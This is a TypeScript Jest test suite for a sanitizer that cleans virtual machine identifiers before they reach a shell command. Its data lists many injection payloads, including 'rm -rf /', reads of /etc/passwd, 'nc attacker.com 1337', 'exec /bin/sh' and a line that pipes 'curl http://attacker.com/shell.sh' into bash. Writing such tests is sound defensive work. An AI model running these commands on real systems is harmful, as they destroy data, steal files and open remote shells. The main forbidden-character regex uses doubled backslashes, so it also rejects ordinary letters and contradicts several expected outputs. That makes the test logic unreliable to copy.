import { sanitizeVmIdentifier } from '../../../prlctl-handler';

describe('Command Injection Prevention', () => {
  describe('sanitizeVmIdentifier', () => {
    const maliciousInputs = [
      // Shell command injection attempts
      { input: 'vm; rm -rf /', desc: 'semicolon command separator' },
      { input: 'vm && cat /etc/passwd', desc: 'AND operator' },
      { input: 'vm || curl evil.com', desc: 'OR operator' },
      { input: 'vm | nc attacker.com 1337', desc: 'pipe operator' },
      { input: 'vm & background_job', desc: 'background operator' },

      // Command substitution attempts
      { input: 'vm`echo pwned`', desc: 'backtick substitution' },
      { input: 'vm$(curl evil.com)', desc: 'dollar substitution' },
      { input: 'vm${parameter}', desc: 'parameter expansion' },
      { input: 'vm$((2+2))', desc: 'arithmetic expansion' },

      // Path traversal attempts
      { input: '../../../etc/passwd', desc: 'path traversal' },
      { input: '..\\..\\..\\windows\\system32', desc: 'windows path traversal' },
      { input: 'vm/../../sensitive', desc: 'mixed path traversal' },

      // Newline injection
      { input: 'vm\nrm -rf /', desc: 'newline injection' },
      { input: 'vm\r\nmalicious command', desc: 'CRLF injection' },

      // Space bypasses
      { input: 'vm${IFS}cat${IFS}/etc/passwd', desc: 'IFS bypass' },
      { input: 'vm\tcat\t/etc/passwd', desc: 'tab characters' },

      // Quote injection
      { input: 'vm"; cat /etc/passwd; echo "', desc: 'double quote injection' },
      { input: "vm'; cat /etc/passwd; echo '", desc: 'single quote injection' },

      // Null byte injection
      { input: 'vm\0cat /etc/passwd', desc: 'null byte injection' },

      // Unicode/encoding attacks
      { input: 'vm\u0000cat', desc: 'unicode null' },
      { input: 'vm%00cat', desc: 'percent encoding' },

      // Wildcard expansion
      { input: 'vm*', desc: 'wildcard expansion' },
      { input: 'vm?', desc: 'single char wildcard' },
      { input: 'vm[a-z]', desc: 'character class' },

      // Environment variable injection
      { input: '$HOME/vm', desc: 'environment variable' },
      { input: '${PATH}/vm', desc: 'braced env variable' },
      { input: '%USERPROFILE%\\vm', desc: 'windows env variable' },

      // Special shell characters
      { input: 'vm!history', desc: 'history expansion' },
      { input: 'vm#comment', desc: 'comment character' },
      { input: 'vm>output.txt', desc: 'output redirection' },
      { input: 'vm<input.txt', desc: 'input redirection' },
      { input: 'vm>>append.txt', desc: 'append redirection' },
      { input: 'vm 2>&1', desc: 'stderr redirection' },

      // Complex combinations
      { input: 'vm;`curl evil.com`;$(whoami)', desc: 'multiple techniques' },
      { input: 'vm && (cat /etc/passwd || echo failed)', desc: 'subshell with operators' },
      { input: 'vm; exec /bin/sh', desc: 'exec replacement' },
    ];

    test.each(maliciousInputs)('should sanitize $desc: "$input"', ({ input }) => {
      const sanitized = sanitizeVmIdentifier(input);

      // Ensure no dangerous characters remain
      expect(sanitized).not.toMatch(/[;&|`$()\\n\\r\\t<>!#*?\\[\\]%'"\\0\\x00]/);
      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toContain('${');
      expect(sanitized).not.toContain('$(');
      expect(sanitized).not.toContain('`');
      expect(sanitized).not.toContain('\\');
      expect(sanitized).not.toContain('/');

      // Ensure only safe characters remain
      expect(sanitized).toMatch(/^[a-zA-Z0-9\-_{}]*$/);
    });

    it('should handle extremely long inputs without ReDoS', () => {
      const longInput = 'a'.repeat(10000) + '; rm -rf /';
      const start = Date.now();
      const result = sanitizeVmIdentifier(longInput);
      const duration = Date.now() - start;

      // Should complete quickly (under 100ms)
      expect(duration).toBeLessThan(100);
      expect(result.length).toBe(10005); // 'a' characters + 'rm-rf' remain
    });

    it('should handle repeated special characters', () => {
      const input = ';;;;;;;;vm;;;;;;;;';
      const result = sanitizeVmIdentifier(input);
      expect(result).toBe('vm');
    });

    it('should handle mixed valid and invalid characters', () => {
      const testCases = [
        { input: 'Test-VM_123;rm -rf /', expected: 'Test-VM_123rm-rf' },
        { input: '{uuid}&& echo', expected: '{uuid}echo' },
        { input: 'vm|name|test', expected: 'vmnametest' },
      ];

      testCases.forEach(({ input, expected }) => {
        expect(sanitizeVmIdentifier(input)).toBe(expected);
      });
    });

    it('should preserve valid UUID format', () => {
      const validUuid = '{12345678-1234-5678-9abc-def012345678}';
      expect(sanitizeVmIdentifier(validUuid)).toBe(validUuid);
    });

    it('should handle empty and whitespace inputs', () => {
      expect(sanitizeVmIdentifier('')).toBe('');
      expect(sanitizeVmIdentifier('   ')).toBe('');
      expect(sanitizeVmIdentifier('\t\n\r')).toBe('');
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent CVE-2021-22204 style attacks', () => {
      // Simulating an attack that tries to exploit command injection via metadata
      const attack = 'vm"|curl -s http://attacker.com/shell.sh|bash #';
      const sanitized = sanitizeVmIdentifier(attack);
      expect(sanitized).toBe('vmcurl-shttpattackercomshellshbash');
    });

    it('should prevent log injection attacks', () => {
      const logInjection = 'vm\n[ERROR] Fake error message\n[INFO] ';
      const sanitized = sanitizeVmIdentifier(logInjection);
      expect(sanitized).not.toContain('\n');
      expect(sanitized).not.toContain('[ERROR]');
    });

    it('should prevent LDAP injection style attacks', () => {
      const ldapInjection = 'vm)(uid=*))(|(uid=*';
      const sanitized = sanitizeVmIdentifier(ldapInjection);
      expect(sanitized).toBe('vmuiduid');
    });
  });
});
